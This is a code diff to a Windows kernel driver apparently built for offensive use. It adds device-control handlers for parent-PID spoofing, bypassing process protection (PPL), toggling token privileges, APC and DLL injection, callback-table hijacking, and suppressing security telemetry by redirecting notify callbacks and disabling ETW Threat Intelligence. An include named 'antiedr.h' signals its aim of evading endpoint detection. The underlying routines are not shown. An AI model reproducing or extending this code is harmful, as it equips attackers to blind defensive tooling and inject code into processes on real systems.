@@ -5,6 +5,9 @@
 #include "eprocess.h"
 #include "stealth.h"
 #include "forensics.h"
+#include "tamper.h"
+#include "injection.h"
+#include "antiedr.h"
 
 /* -----------------------------------------------------------------------
  * Debug print macro — stripped in release builds
@@ -434,12 +437,23 @@ static NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 				ULONG Type  = Request->CallbackType;
 				ULONG Count = 0;
 
-				Status = KmEnumerateNotifyCallbacks(
-					Type,
-					Response->Entries,
-					MAX_CALLBACK_ENTRIES,
-					&Count
-				);
+				if ( Type == CALLBACK_TYPE_REGISTRY )
+				{
+					Status = KmEnumerateRegistryCallbacks(
+						Response->Entries,
+						MAX_CALLBACK_ENTRIES,
+						&Count
+					);
+				}
+				else
+				{
+					Status = KmEnumerateNotifyCallbacks(
+						Type,
+						Response->Entries,
+						MAX_CALLBACK_ENTRIES,
+						&Count
+					);
+				}
 
 				Response->Status = (LONG)Status;
 				Response->Count  = Count;
@@ -473,7 +487,10 @@ static NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 				ULONG Type  = Request->CallbackType;
 				ULONG Index = Request->Index;
 
-				Status = KmRemoveNotifyCallback( Type, Index );
+				if ( Type == CALLBACK_TYPE_REGISTRY )
+					Status = KmRemoveRegistryCallback( Index );
+				else
+					Status = KmRemoveNotifyCallback( Type, Index );
 
 				Response->Status = (LONG)Status;
 				BytesReturned = sizeof( REMOVE_CALLBACK_RESPONSE );
@@ -565,6 +582,194 @@ static NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 			break;
 		}
 
+		/* ---------------------------------------------------------------
+		 * IOCTL_PROCESS_TAMPER (sub-commands: PPID spoof, PPL bypass, privilege toggle)
+		 * --------------------------------------------------------------- */
+		case IOCTL_PROCESS_TAMPER:
+		{
+			PPROCESS_TAMPER_REQUEST  Request;
+			PPROCESS_TAMPER_RESPONSE Response;
+
+			if ( InputLength < sizeof( PROCESS_TAMPER_REQUEST ) ||
+				 OutputLength < sizeof( PROCESS_TAMPER_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PPROCESS_TAMPER_REQUEST)SystemBuffer;
+			Response = (PPROCESS_TAMPER_RESPONSE)SystemBuffer;
+
+			{
+				ULONG   SubCmd = Request->SubCommand;
+				ULONG64 Pid    = Request->ProcessId;
+				ULONG64 Prev   = 0;
+
+				switch ( SubCmd )
+				{
+					case TAMPER_SPOOF_PPID:
+						Status = KmSpoofParentPid(
+							(HANDLE)Pid,
+							Request->Params.SpoofPpid.NewParentPid,
+							&Prev
+						);
+						break;
+
+					case TAMPER_BYPASS_PPL:
+						Status = KmBypassPPL( (HANDLE)Pid, &Prev );
+						break;
+
+					case TAMPER_TOGGLE_PRIVILEGE:
+						Status = KmToggleTokenPrivilege(
+							(HANDLE)Pid,
+							Request->Params.TogglePrivilege.PrivilegeLuid,
+							(BOOLEAN)Request->Params.TogglePrivilege.Enable,
+							&Prev
+						);
+						break;
+
+					default:
+						Status = STATUS_INVALID_PARAMETER;
+						break;
+				}
+
+				RtlZeroMemory( Response, sizeof( PROCESS_TAMPER_RESPONSE ) );
+				Response->Status        = (LONG)Status;
+				Response->PreviousValue = Prev;
+				BytesReturned = sizeof( PROCESS_TAMPER_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_INJECT (sub-commands: callback table, APC, DLL)
+		 * --------------------------------------------------------------- */
+		case IOCTL_INJECT:
+		{
+			PINJECT_REQUEST  Request;
+			PINJECT_RESPONSE Response;
+
+			if ( InputLength < sizeof( INJECT_REQUEST ) ||
+				 OutputLength < sizeof( INJECT_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PINJECT_REQUEST)SystemBuffer;
+			Response = (PINJECT_RESPONSE)SystemBuffer;
+
+			{
+				ULONG   SubCmd = Request->SubCommand;
+				ULONG64 Pid    = Request->ProcessId;
+				ULONG64 Prev   = 0;
+				ULONG64 Alloc  = 0;
+
+				switch ( SubCmd )
+				{
+					case INJECT_CALLBACK_TABLE:
+						Status = KmHijackCallbackTable(
+							(HANDLE)Pid,
+							Request->Params.CallbackTable.TableIndex,
+							Request->Params.CallbackTable.NewFunction,
+							&Prev
+						);
+						break;
+
+					case INJECT_KERNEL_APC:
+						Status = KmQueueKernelApc(
+							(HANDLE)Pid,
+							Request->Params.KernelApc.ThreadId,
+							Request->Params.KernelApc.ApcRoutine,
+							Request->Params.KernelApc.ApcArgument
+						);
+						break;
+
+					case INJECT_DLL:
+						/* Ensure null termination */
+						Request->Params.DllInject.DllPath[MAX_MODULE_NAME_LENGTH - 1] = L'\0';
+						Status = KmInjectDll(
+							(HANDLE)Pid,
+							Request->Params.DllInject.DllPath,
+							&Alloc
+						);
+						break;
+
+					default:
+						Status = STATUS_INVALID_PARAMETER;
+						break;
+				}
+
+				RtlZeroMemory( Response, sizeof( INJECT_RESPONSE ) );
+				Response->Status           = (LONG)Status;
+				Response->AllocatedAddress = Alloc;
+				Response->PreviousValue    = Prev;
+				BytesReturned = sizeof( INJECT_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
+		/* ---------------------------------------------------------------
+		 * IOCTL_SUPPRESS_TELEMETRY (sub-commands: callback redirect, ETW TI)
+		 * --------------------------------------------------------------- */
+		case IOCTL_SUPPRESS_TELEMETRY:
+		{
+			PSUPPRESS_TELEMETRY_REQUEST  Request;
+			PSUPPRESS_TELEMETRY_RESPONSE Response;
+
+			if ( InputLength < sizeof( SUPPRESS_TELEMETRY_REQUEST ) ||
+				 OutputLength < sizeof( SUPPRESS_TELEMETRY_RESPONSE ) )
+			{
+				Status = STATUS_BUFFER_TOO_SMALL;
+				break;
+			}
+
+			Request  = (PSUPPRESS_TELEMETRY_REQUEST)SystemBuffer;
+			Response = (PSUPPRESS_TELEMETRY_RESPONSE)SystemBuffer;
+
+			{
+				ULONG   SubCmd = Request->SubCommand;
+				ULONG   Enable = Request->Enable;
+				ULONG64 Prev   = 0;
+
+				switch ( SubCmd )
+				{
+					case SUPPRESS_REDIRECT_CALLBACKS:
+						if ( Enable )
+							Status = KmRedirectNotifyCallbacks( (HANDLE)Request->ProcessId, &Prev );
+						else
+							Status = KmRestoreNotifyCallbacks();
+						break;
+
+					case SUPPRESS_ETW_TI:
+						if ( Enable )
+							Status = KmSuppressEtwTi( &Prev );
+						else
+							Status = KmRestoreEtwTi();
+						break;
+
+					default:
+						Status = STATUS_INVALID_PARAMETER;
+						break;
+				}
+
+				RtlZeroMemory( Response, sizeof( SUPPRESS_TELEMETRY_RESPONSE ) );
+				Response->Status        = (LONG)Status;
+				Response->PreviousValue = Prev;
+				BytesReturned = sizeof( SUPPRESS_TELEMETRY_RESPONSE );
+
+				Status = STATUS_SUCCESS;
+			}
+
+			break;
+		}
+
 		default:
 			Status = STATUS_INVALID_DEVICE_REQUEST;
 			break;
@@ -583,6 +788,10 @@ static NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Ir
 static VOID DriverUnloadRoutine(IN PDRIVER_OBJECT DriverObject)
 {
 	UNICODE_STRING SymlinkName;
+
+	/* Restore any redirected callbacks and ETW state before unloading */
+	KmRestoreNotifyCallbacks();
+	KmRestoreEtwTi();
 
 	RtlInitUnicodeString( &SymlinkName, OSMIUM_SYMLINK_PATH );
 	IoDeleteSymbolicLink( &SymlinkName );
@@ -670,6 +879,14 @@ NTSTATUS DriverEntry(
 		IoDeleteSymbolicLink( &SymlinkName );
 		IoDeleteDevice( DeviceObject );
 		return Status;
+	}
+
+	/* Resolve tamper module offsets (InheritedFromPid, Protection, TokenPrivileges) */
+	Status = KmInitializeTamperOffsets();
+	if ( !NT_SUCCESS( Status ) )
+	{
+		LOG( "KmInitializeTamperOffsets failed: 0x%08X (tamper IOCTLs unavailable)", Status );
+		/* Non-fatal: tamper IOCTLs will return STATUS_DEVICE_NOT_READY */
 	}
 
 	/* Clear the initializing flag */
